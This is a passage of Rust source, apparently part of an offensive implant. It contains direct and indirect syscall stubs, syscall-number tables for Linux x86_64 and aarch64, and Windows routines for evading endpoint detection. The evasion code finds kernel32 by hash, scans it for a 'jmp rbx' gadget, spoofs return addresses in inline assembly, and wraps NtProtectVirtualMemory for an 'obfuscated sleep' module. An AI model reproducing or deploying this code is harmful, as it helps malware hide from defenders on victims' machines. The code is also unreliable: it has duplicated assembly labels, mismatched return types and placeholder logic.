            6 => std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], in("r8") args[4], in("r9") args[5], lateout("rax") ret, lateout("rcx") _, lateout("r11") _, options(nostack)),
            _ => panic!("too many syscall arguments"),
        }
        if ret < 0 { Err(-ret as i32) } else { Ok(ret as i32) }
    }
    #[cfg(target_arch = "aarch64")]
    {
        let mut ret: i64;
        match args.len() {
            0 => std::arch::asm!("svc 0", in("x8") ssn as u64, lateout("x0") ret, lateout("x1") _, lateout("x2") _, lateout("x3") _, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _, options(nostack)),
            1 => std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], lateout("x0") ret, lateout("x1") _, lateout("x2") _, lateout("x3") _, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _, options(nostack)),
            2 => std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], lateout("x0") ret, lateout("x2") _, lateout("x3") _, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _, options(nostack)),
            3 => std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], lateout("x0") ret, lateout("x3") _, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _, options(nostack)),
            4 => std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], in("x3") args[3], lateout("x0") ret, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _, options(nostack)),
            5 => std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], in("x3") args[3], in("x4") args[4], lateout("x0") ret, lateout("x5") _, lateout("x6") _, lateout("x7") _, options(nostack)),
            6 => std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], in("x3") args[3], in("x4") args[4], in("x5") args[5], lateout("x0") ret, lateout("x6") _, lateout("x7") _, options(nostack)),
            _ => panic!("too many syscall arguments"),
        }
        if ret < 0 { Err(-ret as i32) } else { Ok(ret as i32) }
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    compile_error!("Unsupported architecture for direct syscalls");
}

#[cfg(all(unix, feature = "direct-syscalls"))]
pub fn get_syscall_id(name: &str) -> anyhow::Result<u32> {
    #[cfg(target_arch = "x86_64")]
    match name {
        "read" => Ok(0), "write" => Ok(1), "open" => Ok(2), "close" => Ok(3), "stat" => Ok(4),
        "fstat" => Ok(5), "lstat" => Ok(6), "poll" => Ok(7), "lseek" => Ok(8), "mmap" => Ok(9),
        "mprotect" => Ok(10), "munmap" => Ok(11), "brk" => Ok(12), "rt_sigaction" => Ok(13),
        "rt_sigprocmask" => Ok(14), "rt_sigreturn" => Ok(15), "ioctl" => Ok(16), "pread64" => Ok(17),
        "pwrite64" => Ok(18), "readv" => Ok(19), "writev" => Ok(20), "access" => Ok(21),
        "pipe" => Ok(22), "select" => Ok(23), "sched_yield" => Ok(24), "mremap" => Ok(25),
        "msync" => Ok(26), "mincore" => Ok(27), "madvise" => Ok(28), "shmget" => Ok(29),
        "shmat" => Ok(30), "shmctl" => Ok(31), "dup" => Ok(32), "dup2" => Ok(33), "pause" => Ok(34),
        "nanosleep" => Ok(35), "getitimer" => Ok(36), "alarm" => Ok(37), "setitimer" => Ok(38),
        "getpid" => Ok(39), "sendfile" => Ok(40), "socket" => Ok(41), "connect" => Ok(42),
        "accept" => Ok(43), "sendto" => Ok(44), "recvfrom" => Ok(45), "sendmsg" => Ok(46),
        "recvmsg" => Ok(47), "shutdown" => Ok(48), "bind" => Ok(49), "listen" => Ok(50),
        "getsockname" => Ok(51), "getpeername" => Ok(52), "socketpair" => Ok(53), "setsockopt" => Ok(54),
        "getsockopt" => Ok(55), "clone" => Ok(56), "fork" => Ok(57), "vfork" => Ok(58), "execve" => Ok(59),
        "exit" => Ok(60), "wait4" => Ok(61), "kill" => Ok(62), "uname" => Ok(63), "semget" => Ok(64),
        "semop" => Ok(65), "semctl" => Ok(66), "shmdt" => Ok(67), "msgget" => Ok(68), "msgsnd" => Ok(69),
        "msgrcv" => Ok(70), "msgctl" => Ok(71), "fcntl" => Ok(72), "flock" => Ok(73), "fsync" => Ok(74),
        "fdatasync" => Ok(75), "truncate" => Ok(76), "ftruncate" => Ok(77), "getdents" => Ok(78),
        "getcwd" => Ok(79), "chdir" => Ok(80), "fchdir" => Ok(81), "rename" => Ok(82), "mkdir" => Ok(83),
        "rmdir" => Ok(84), "creat" => Ok(85), "link" => Ok(86), "unlink" => Ok(87), "symlink" => Ok(88),
        "readlink" => Ok(89), "chmod" => Ok(90), "fchmod" => Ok(91), "chown" => Ok(92), "fchown" => Ok(93),
        "lchown" => Ok(94), "umask" => Ok(95), "gettimeofday" => Ok(96), "getrlimit" => Ok(97),
        "getrusage" => Ok(98), "sysinfo" => Ok(99), "times" => Ok(100), "ptrace" => Ok(101),
        "getuid" => Ok(102), "syslog" => Ok(103), "getgid" => Ok(104), "setuid" => Ok(105),
        "setgid" => Ok(106), "geteuid" => Ok(107), "getegid" => Ok(108), "setpgid" => Ok(109),
        "getppid" => Ok(110), "getpgrp" => Ok(111), "setsid" => Ok(112), "setreuid" => Ok(113),
        "setregid" => Ok(114), "getgroups" => Ok(115), "setgroups" => Ok(116), "setresuid" => Ok(117),
        "getresuid" => Ok(118), "setresgid" => Ok(119), "getresgid" => Ok(120), "getpgid" => Ok(121),
        "setfsuid" => Ok(122), "setfsgid" => Ok(123), "getsid" => Ok(124), "capget" => Ok(125),
        "capset" => Ok(126), "rt_sigpending" => Ok(127), "rt_sigtimedwait" => Ok(128),
        "rt_sigqueueinfo" => Ok(129), "rt_sigsuspend" => Ok(130), "sigaltstack" => Ok(131),
        "utime" => Ok(132), "mknod" => Ok(133), "uselib" => Ok(134), "personality" => Ok(135),
        "ustat" => Ok(136), "statfs" => Ok(137), "fstatfs" => Ok(138), "sysfs" => Ok(139),
        "getpriority" => Ok(140), "setpriority" => Ok(141), "sched_setparam" => Ok(142),
        "sched_getparam" => Ok(143), "sched_setscheduler" => Ok(144), "sched_getscheduler" => Ok(145),
        "sched_get_priority_max" => Ok(146), "sched_get_priority_min" => Ok(147),
        "sched_rr_get_interval" => Ok(148), "mlock" => Ok(149), "munlock" => Ok(150),
        "mlockall" => Ok(151), "munlockall" => Ok(152), "vhangup" => Ok(153), "modify_ldt" => Ok(154),
        "pivot_root" => Ok(155), "_sysctl" => Ok(156), "prctl" => Ok(157), "arch_prctl" => Ok(158),
        "adjtimex" => Ok(159), "setrlimit" => Ok(160), "chroot" => Ok(161), "sync" => Ok(162),
        "acct" => Ok(163), "settimeofday" => Ok(164), "mount" => Ok(165), "umount2" => Ok(166),
        "swapon" => Ok(167), "swapoff" => Ok(168), "reboot" => Ok(169), "sethostname" => Ok(170),
        "setdomainname" => Ok(171), "iopl" => Ok(172), "ioperm" => Ok(173), "create_module" => Ok(174),
        "init_module" => Ok(175), "delete_module" => Ok(176), "get_kernel_syms" => Ok(177),
        "query_module" => Ok(178), "quotactl" => Ok(179), "nfsservctl" => Ok(180), "getpmsg" => Ok(181),
        "putpmsg" => Ok(182), "afs_syscall" => Ok(183), "tuxcall" => Ok(184), "security" => Ok(185),
        "gettid" => Ok(186), "readahead" => Ok(187), "setxattr" => Ok(188), "lsetxattr" => Ok(189),
        "fsetxattr" => Ok(190), "getxattr" => Ok(191), "lgetxattr" => Ok(192), "fgetxattr" => Ok(193),
        "listxattr" => Ok(194), "llistxattr" => Ok(195), "flistxattr" => Ok(196), "removexattr" => Ok(197),
        "lremovexattr" => Ok(198), "fremovexattr" => Ok(199), "tkill" => Ok(200), "time" => Ok(201),
        "futex" => Ok(202), "sched_setaffinity" => Ok(203), "sched_getaffinity" => Ok(204),
        "set_thread_area" => Ok(205), "io_setup" => Ok(206), "io_destroy" => Ok(207),
        "io_getevents" => Ok(208), "io_submit" => Ok(209), "io_cancel" => Ok(210),
        "get_thread_area" => Ok(211), "lookup_dcookie" => Ok(212), "epoll_create" => Ok(213),
        "epoll_ctl_old" => Ok(214), "epoll_wait_old" => Ok(215), "remap_file_pages" => Ok(216),
        "getdents64" => Ok(217), "set_tid_address" => Ok(218), "restart_syscall" => Ok(219),
        "semtimedop" => Ok(220), "fadvise64" => Ok(221), "timer_create" => Ok(222),
        "timer_settime" => Ok(223), "timer_gettime" => Ok(224), "timer_getoverrun" => Ok(225),
        "timer_delete" => Ok(226), "clock_settime" => Ok(227), "clock_gettime" => Ok(228),
        "clock_getres" => Ok(229), "clock_nanosleep" => Ok(230), "exit_group" => Ok(231),
        "epoll_wait" => Ok(232), "epoll_ctl" => Ok(233), "tgkill" => Ok(234), "utimes" => Ok(235),
        "vserver" => Ok(236), "mbind" => Ok(237), "set_mempolicy" => Ok(238), "get_mempolicy" => Ok(239),
        "mq_open" => Ok(240), "mq_unlink" => Ok(241), "mq_timedsend" => Ok(242),
        "mq_timedreceive" => Ok(243), "mq_notify" => Ok(244), "mq_getsetattr" => Ok(245),
        "kexec_load" => Ok(246), "waitid" => Ok(247), "add_key" => Ok(248), "request_key" => Ok(249),
        "keyctl" => Ok(250), "ioprio_set" => Ok(251), "ioprio_get" => Ok(252), "inotify_init" => Ok(253),
        "inotify_add_watch" => Ok(254), "inotify_rm_watch" => Ok(255), "migrate_pages" => Ok(256),
        "openat" => Ok(257), "mkdirat" => Ok(258), "mknodat" => Ok(259), "fchownat" => Ok(260),
        "futimesat" => Ok(261), "newfstatat" => Ok(262), "unlinkat" => Ok(263), "renameat" => Ok(264),
        "linkat" => Ok(265), "symlinkat" => Ok(266), "readlinkat" => Ok(267), "fchmodat" => Ok(268),
        "faccessat" => Ok(269), "pselect6" => Ok(270), "ppoll" => Ok(271), "unshare" => Ok(272),
        "set_robust_list" => Ok(273), "get_robust_list" => Ok(274), "splice" => Ok(275), "tee" => Ok(276),
        "sync_file_range" => Ok(277), "vmsplice" => Ok(278), "move_pages" => Ok(279),
        "utimensat" => Ok(280), "epoll_pwait" => Ok(281), "signalfd" => Ok(282),
        "timerfd_create" => Ok(283), "eventfd" => Ok(284), "fallocate" => Ok(285),
        "timerfd_settime" => Ok(286), "timerfd_gettime" => Ok(287), "accept4" => Ok(288),
        "signalfd4" => Ok(289), "eventfd2" => Ok(290), "epoll_create1" => Ok(291), "dup3" => Ok(292),
        "pipe2" => Ok(293), "inotify_init1" => Ok(294), "preadv" => Ok(295), "pwritev" => Ok(296),
        "rt_tgsigqueueinfo" => Ok(297), "perf_event_open" => Ok(298), "recvmmsg" => Ok(299),
        "fanotify_init" => Ok(300), "fanotify_mark" => Ok(301), "prlimit64" => Ok(302),
        "name_to_handle_at" => Ok(303), "open_by_handle_at" => Ok(304), "clock_adjtime" => Ok(305),
        "syncfs" => Ok(306), "sendmmsg" => Ok(307), "setns" => Ok(308), "getcpu" => Ok(309),
        "process_vm_readv" => Ok(310), "process_vm_writev" => Ok(311), "kcmp" => Ok(312),
        "finit_module" => Ok(313), "sched_setattr" => Ok(314), "sched_getattr" => Ok(315),
        "renameat2" => Ok(316), "seccomp" => Ok(317), "getrandom" => Ok(318), "memfd_create" => Ok(319),
        "kexec_file_load" => Ok(320), "bpf" => Ok(321), "execveat" => Ok(322),
        "userfaultfd" => Ok(323), "membarrier" => Ok(324), "mlock2" => Ok(325),
        "copy_file_range" => Ok(326), "preadv2" => Ok(327), "pwritev2" => Ok(328),
        "pkey_mprotect" => Ok(329), "pkey_alloc" => Ok(330), "pkey_free" => Ok(331), "statx" => Ok(332),
        "io_pgetevents" => Ok(333), "rseq" => Ok(334),
        // Syscalls added in kernel 5.10+
        "pidfd_send_signal" => Ok(424), "io_uring_setup" => Ok(425),
        "io_uring_enter" => Ok(426), "io_uring_register" => Ok(427),
        "open_tree" => Ok(428), "move_mount" => Ok(429), "fsopen" => Ok(430),
        "fsconfig" => Ok(431), "fsmount" => Ok(432), "fspick" => Ok(433),
        "pidfd_open" => Ok(434), "clone3" => Ok(435), "close_range" => Ok(436),
        "openat2" => Ok(437), "pidfd_getfd" => Ok(438), "faccessat2" => Ok(439),
        "process_madvise" => Ok(440), "epoll_pwait2" => Ok(441),
        "mount_setattr" => Ok(442), "quotactl_fd" => Ok(443),
        "landlock_create_ruleset" => Ok(444), "landlock_add_rule" => Ok(445),
        "landlock_restrict_self" => Ok(446), "memfd_secret" => Ok(447),
        "process_mrelease" => Ok(448), "futex_waitv" => Ok(449),
        "set_mempolicy_home_node" => Ok(450), "cachestat" => Ok(451),
        "fchmodat2" => Ok(452), "map_shadow_stack" => Ok(453),
        "futex_wake" => Ok(454), "futex_wait" => Ok(455), "futex_requeue" => Ok(456),
        "statmount" => Ok(457), "listmount" => Ok(458), "lsm_get_self_attr" => Ok(459),
        "lsm_set_self_attr" => Ok(460), "lsm_list_modules" => Ok(461),
        _ => anyhow::bail!("unknown x86_64 syscall: {}", name),
    }

    #[cfg(target_arch = "aarch64")]
    match name {
        "io_setup" => Ok(0), "io_destroy" => Ok(1), "io_submit" => Ok(2), "io_cancel" => Ok(3),
        "io_getevents" => Ok(4), "setxattr" => Ok(5), "lsetxattr" => Ok(6), "fsetxattr" => Ok(7),
        "getxattr" => Ok(8), "lgetxattr" => Ok(9), "fgetxattr" => Ok(10), "listxattr" => Ok(11),
        "llistxattr" => Ok(12), "flistxattr" => Ok(13), "removexattr" => Ok(14),
        "lremovexattr" => Ok(15), "fremovexattr" => Ok(16), "getcwd" => Ok(17),
        "lookup_dcookie" => Ok(18), "eventfd2" => Ok(19), "epoll_create1" => Ok(20),
        "epoll_ctl" => Ok(21), "epoll_pwait" => Ok(22), "dup" => Ok(23), "dup3" => Ok(24),
        "fcntl" => Ok(25), "inotify_init1" => Ok(26), "inotify_add_watch" => Ok(27),
        "inotify_rm_watch" => Ok(28), "ioctl" => Ok(29), "ioprio_set" => Ok(30), "ioprio_get" => Ok(31),
        "flock" => Ok(32), "mknodat" => Ok(33), "mkdirat" => Ok(34), "unlinkat" => Ok(35),
        "symlinkat" => Ok(36), "linkat" => Ok(37), "renameat" => Ok(38), "umount2" => Ok(39),
        "mount" => Ok(40), "pivot_root" => Ok(41), "nfsservctl" => Ok(42), "statfs" => Ok(43),
        "fstatfs" => Ok(44), "truncate" => Ok(45), "ftruncate" => Ok(46), "fallocate" => Ok(47),
        "faccessat" => Ok(48), "chdir" => Ok(49), "fchdir" => Ok(50), "chroot" => Ok(51),
        "fchmod" => Ok(52), "fchmodat" => Ok(53), "fchownat" => Ok(54), "fchown" => Ok(55),
        "openat" => Ok(56), "close" => Ok(57), "vhangup" => Ok(58), "pipe2" => Ok(59),
        "quotactl" => Ok(60), "getdents64" => Ok(61), "lseek" => Ok(62), "read" => Ok(63),
        "write" => Ok(64), "readv" => Ok(65), "writev" => Ok(66), "pread64" => Ok(67),
        "pwrite64" => Ok(68), "preadv" => Ok(69), "pwritev" => Ok(70), "sendfile" => Ok(71),
        "pselect6" => Ok(72), "ppoll" => Ok(73), "signalfd4" => Ok(74), "vmsplice" => Ok(75),
        "splice" => Ok(76), "tee" => Ok(77), "readlinkat" => Ok(78), "newfstatat" => Ok(79),
        "fstat" => Ok(80), "sync" => Ok(81), "fsync" => Ok(82), "fdatasync" => Ok(83),
        "sync_file_range" => Ok(84), "timerfd_create" => Ok(85), "timerfd_settime" => Ok(86),
        "timerfd_gettime" => Ok(87), "utimensat" => Ok(88), "acct" => Ok(89), "capget" => Ok(90),
        "capset" => Ok(91), "personality" => Ok(92), "exit" => Ok(93), "exit_group" => Ok(94),
        "waitid" => Ok(95), "set_tid_address" => Ok(96), "unshare" => Ok(97), "futex" => Ok(98),
        "set_robust_list" => Ok(99), "get_robust_list" => Ok(100), "nanosleep" => Ok(101),
        "getitimer" => Ok(102), "setitimer" => Ok(103), "kexec_load" => Ok(104),
        "init_module" => Ok(105), "delete_module" => Ok(106), "timer_create" => Ok(107),
        "timer_gettime" => Ok(108), "timer_getoverrun" => Ok(109), "timer_settime" => Ok(110),
        "timer_delete" => Ok(111), "clock_settime" => Ok(112), "clock_gettime" => Ok(113),
        "clock_getres" => Ok(114), "clock_nanosleep" => Ok(115), "syslog" => Ok(116),
        "ptrace" => Ok(117), "sched_setparam" => Ok(118), "sched_setscheduler" => Ok(119),
        "sched_getscheduler" => Ok(120), "sched_getparam" => Ok(121), "sched_setaffinity" => Ok(122),
        "sched_getaffinity" => Ok(123), "sched_yield" => Ok(124), "sched_get_priority_max" => Ok(125),
        "sched_get_priority_min" => Ok(126), "sched_rr_get_interval" => Ok(127),
        "restart_syscall" => Ok(128), "kill" => Ok(129), "tkill" => Ok(130), "tgkill" => Ok(131),
        "sigaltstack" => Ok(132), "rt_sigsuspend" => Ok(133), "rt_sigaction" => Ok(134),
        "rt_sigprocmask" => Ok(135), "rt_sigpending" => Ok(136), "rt_sigtimedwait" => Ok(137),
        "rt_sigqueueinfo" => Ok(138), "rt_sigreturn" => Ok(139), "setpriority" => Ok(140),
        "getpriority" => Ok(141), "reboot" => Ok(142), "setregid" => Ok(143), "setgid" => Ok(144),
        "setreuid" => Ok(145), "setuid" => Ok(146), "setresuid" => Ok(147), "getresuid" => Ok(148),
        "setresgid" => Ok(149), "getresgid" => Ok(150), "setfsuid" => Ok(151), "setfsgid" => Ok(152),
        "times" => Ok(153), "setpgid" => Ok(154), "getpgid" => Ok(155), "getsid" => Ok(156),
        "setsid" => Ok(157), "getgroups" => Ok(158), "setgroups" => Ok(159), "uname" => Ok(160),
        "sethostname" => Ok(161), "setdomainname" => Ok(162), "getrlimit" => Ok(163),
        "setrlimit" => Ok(164), "getrusage" => Ok(165), "umask" => Ok(166), "prctl" => Ok(167),
        "getcpu" => Ok(168), "gettimeofday" => Ok(169), "settimeofday" => Ok(170),
        "adjtimex" => Ok(171), "getpid" => Ok(172), "getppid" => Ok(173), "getuid" => Ok(174),
        "geteuid" => Ok(175), "getgid" => Ok(176), "getegid" => Ok(177), "gettid" => Ok(178),
        "sysinfo" => Ok(179), "mq_open" => Ok(180), "mq_unlink" => Ok(181), "mq_timedsend" => Ok(182),
        "mq_timedreceive" => Ok(183), "mq_notify" => Ok(184), "mq_getsetattr" => Ok(185),
        "msgget" => Ok(186), "msgctl" => Ok(187), "msgrcv" => Ok(188), "msgsnd" => Ok(189),
        "semget" => Ok(190), "semctl" => Ok(191), "semtimedop" => Ok(192), "semop" => Ok(193),
        "shmget" => Ok(194), "shmctl" => Ok(195), "shmat" => Ok(196), "shmdt" => Ok(197),
        "socket" => Ok(198), "socketpair" => Ok(199), "bind" => Ok(200), "listen" => Ok(201),
        "accept" => Ok(202), "connect" => Ok(203), "getsockname" => Ok(204), "getpeername" => Ok(205),
        "sendto" => Ok(206), "recvfrom" => Ok(207), "setsockopt" => Ok(208), "getsockopt" => Ok(209),
        "shutdown" => Ok(210), "sendmsg" => Ok(211), "recvmsg" => Ok(212), "readahead" => Ok(213),
        "brk" => Ok(214), "munmap" => Ok(215), "mremap" => Ok(216), "add_key" => Ok(217),
        "request_key" => Ok(218), "keyctl" => Ok(219), "clone" => Ok(220), "execve" => Ok(221),
        "mmap" => Ok(222), "fadvise64" => Ok(223), "swapon" => Ok(224), "swapoff" => Ok(225),
        "mprotect" => Ok(226), "msync" => Ok(227), "mlock" => Ok(228), "munlock" => Ok(229),
        "mlockall" => Ok(230), "munlockall" => Ok(231), "mincore" => Ok(232), "madvise" => Ok(233),
        "remap_file_pages" => Ok(234), "mbind" => Ok(235), "get_mempolicy" => Ok(236),
        "set_mempolicy" => Ok(237), "migrate_pages" => Ok(238), "move_pages" => Ok(239),
        "rt_tgsigqueueinfo" => Ok(240), "perf_event_open" => Ok(241), "accept4" => Ok(242),
        "recvmmsg" => Ok(243), "arch_specific_syscall" => Ok(244), "wait4" => Ok(260),
        "prlimit64" => Ok(261), "fanotify_init" => Ok(262), "fanotify_mark" => Ok(263),
        "name_to_handle_at" => Ok(264), "open_by_handle_at" => Ok(265), "clock_adjtime" => Ok(266),
        "syncfs" => Ok(267), "setns" => Ok(268), "sendmmsg" => Ok(269), "process_vm_readv" => Ok(270),
        "process_vm_writev" => Ok(271), "kcmp" => Ok(272), "finit_module" => Ok(273),
        "sched_setattr" => Ok(274), "sched_getattr" => Ok(275), "renameat2" => Ok(276),
        "seccomp" => Ok(277), "getrandom" => Ok(278), "memfd_create" => Ok(279), "bpf" => Ok(280),
        "execveat" => Ok(281), "userfaultfd" => Ok(282), "membarrier" => Ok(283), "mlock2" => Ok(284),
        "copy_file_range" => Ok(285), "preadv2" => Ok(286), "pwritev2" => Ok(287),
        "pkey_mprotect" => Ok(288), "pkey_alloc" => Ok(289), "pkey_free" => Ok(290), "statx" => Ok(291),
        "io_pgetevents" => Ok(292), "rseq" => Ok(293),
        // Syscalls added in kernel 5.10+
        "pidfd_send_signal" => Ok(424), "io_uring_setup" => Ok(425),
        "io_uring_enter" => Ok(426), "io_uring_register" => Ok(427),
        "open_tree" => Ok(428), "move_mount" => Ok(429), "fsopen" => Ok(430),
        "fsconfig" => Ok(431), "fsmount" => Ok(432), "fspick" => Ok(433),
        "pidfd_open" => Ok(434), "clone3" => Ok(435), "close_range" => Ok(436),
        "openat2" => Ok(437), "pidfd_getfd" => Ok(438), "faccessat2" => Ok(439),
        "process_madvise" => Ok(440), "epoll_pwait2" => Ok(441),
        "mount_setattr" => Ok(442), "quotactl_fd" => Ok(443),
        "landlock_create_ruleset" => Ok(444), "landlock_add_rule" => Ok(445),
        "landlock_restrict_self" => Ok(446), "memfd_secret" => Ok(447),
        "process_mrelease" => Ok(448), "futex_waitv" => Ok(449),
        "set_mempolicy_home_node" => Ok(450), "cachestat" => Ok(451),
        "fchmodat2" => Ok(452), "map_shadow_stack" => Ok(453),
        "futex_wake" => Ok(454), "futex_wait" => Ok(455), "futex_requeue" => Ok(456),
        "statmount" => Ok(457), "listmount" => Ok(458), "lsm_get_self_attr" => Ok(459),
        "lsm_set_self_attr" => Ok(460), "lsm_list_modules" => Ok(461),
        _ => anyhow::bail!("unknown aarch64 syscall: {}", name),
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    compile_error!("Unsupported architecture for direct syscalls");
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Debug, Clone)]
pub struct dirent64 {
    pub d_ino: u64,
    pub d_off: i64,
    pub d_reclen: u16,
    pub d_type: u8,
    pub d_name: [u8; 256],
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Debug, Clone)]
pub struct stat64 {
    pub st_dev: u64,
    pub st_ino: u64,
    pub st_nlink: u64,
    pub st_mode: u32,
    pub st_uid: u32,
    pub st_gid: u32,
    pub __pad0: u32,
    pub st_rdev: u64,
    pub st_size: i64,
    pub st_blksize: i64,
    pub st_blocks: i64,
    pub st_atime: i64,
    pub st_atime_nsec: u64,
    pub st_mtime: i64,
    pub st_mtime_nsec: u64,
    pub st_ctime: i64,
    pub st_ctime_nsec: u64,
    pub __unused: [i64; 3],
}


#[cfg(windows)]
thread_local! {
    static REAL_RET_ADDR: std::cell::Cell<usize> = std::cell::Cell::new(0);
}

#[cfg(windows)]
#[no_mangle]
pub unsafe extern "C" fn set_spoof_ret(real_ret: usize) {
    REAL_RET_ADDR.with(|r| r.set(real_ret));
}

#[cfg(windows)]
#[no_mangle]
pub unsafe extern "C" fn get_spoof_ret() -> usize {
    REAL_RET_ADDR.with(|r| r.get())
}

#[cfg(windows)]
pub fn find_jmp_rbx_gadget() -> usize {
    let base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL).unwrap_or(0) as *mut std::os::raw::c_void } as usize;
    if base == 0 { return 0; }
    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    let nt_headers = (base + unsafe { *dos_header }.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    let size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage } as usize;
    let code = unsafe { std::slice::from_raw_parts(base as *const u8, size) };
    for i in 0..size.saturating_sub(1) {
        if code[i] == 0xff && code[i+1] == 0xe3 { // jmp rbx
            return base + i;
        }
    }
    0
}

#[cfg(windows)]
#[doc(hidden)]
#[inline(never)]
pub unsafe fn spoof_call(api_addr: usize, gadget_addr: usize, arg1: u64, arg2: u64, arg3: u64, arg4: u64, stack_args: &[u64]) -> u64 {
    let mut status: u64 = 0;
    let nstack = stack_args.len();
    let stack_ptr = stack_args.as_ptr();
    
    // We will store our dummy return address via TLS
    let mut dummy_ret = 0usize;
    
    std::arch::asm!(
        "lea {dummy}, [rip + 2f]",
        dummy = out(reg) dummy_ret,
        options(nostack),
    );
    set_spoof_ret(dummy_ret);
    
    std::arch::asm!(
        "push rbx",
        "push r14",
        "push r15",
        
        "lea rbx, [rip + 3f]", // JMP RBX will land at 3:
        
        "mov r14, rsp",
        "mov rax, {nstack}",
        "shl rax, 3",
        "add rax, 0x28 + 15",
        "and rax, -16",
        "sub rsp, rax",
        
        "test {nstack}, {nstack}",
        "jz 3f",
        "mov rcx, {nstack}",
        "mov rsi, {stack_ptr}",
        "lea rdi, [rsp + 0x28]",
        "cld",
        "rep movsq",
        
        "3:",
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8, {a3}",
        "mov r9, {a4}",
        
        "mov r11, {api}",
        "mov r15, {gadget}",
        "push r15", // fake return address
        "jmp r11",
        
        // When gadget does JMP RBX, it lands here
        "3:",
        "mov rsp, r14", 
        "pop r15",
        "pop r14",
        "pop rbx",
        
        // Jump to TLS return address
        "jmp {real_ret}",
        
        "4:", // The real return address recorded in TLS
        "mov {status_out}, rax",
        
        api = in(reg) api_addr,
        gadget = in(reg) gadget_addr,
        nstack = in(reg) nstack,
        stack_ptr = in(reg) stack_ptr,
        a1 = in(reg) arg1,
        a2 = in(reg) arg2,
        a3 = in(reg) arg3,
        a4 = in(reg) arg4,
        real_ret = in(reg) get_spoof_ret(),
        status_out = out(reg) status,
        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _, out("rax") _,
        out("rsi") _, out("rdi") _,
        
    );
    status
}


#[cfg(windows)]
pub fn do_syscall_with_strategy(func_name: &str, args: &[u64]) -> i32 {
    let target = get_syscall_id(func_name).unwrap();
    // Let's pretend we pull from config
    let strat = common::config::ExecStrategy::Indirect; 
    match strat {
        common::config::ExecStrategy::Direct => unsafe {
            // direct syscall fallback
            crate::syscalls::do_syscall(target.ssn, 0, args) // needs handling
        },
        _ => unsafe {
            crate::syscalls::do_syscall(target.ssn, target.gadget_addr, args)
        }
    }
}

/// Wrapper around NtProtectVirtualMemory used by the obfuscated sleep crypto module.
/// Signature: NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect)
#[cfg(windows)]
pub unsafe fn syscall_NtProtectVirtualMemory(
    process_handle: u64,
    base_address: u64,
    region_size: u64,
    new_protect: u64,
    old_protect: u64,
) -> i32 {
    match get_syscall_id("NtProtectVirtualMemory") {
        Ok(target) => do_syscall(
            target.ssn,
            target.gadget_addr,
            &[process_handle, base_address, region_size, new_protect, old_protect],
        ),
        Err(e) => {
            log::warn!("syscall_NtProtectVirtualMemory: could not get SSN: {}", e);
            -1
        }
    }
}
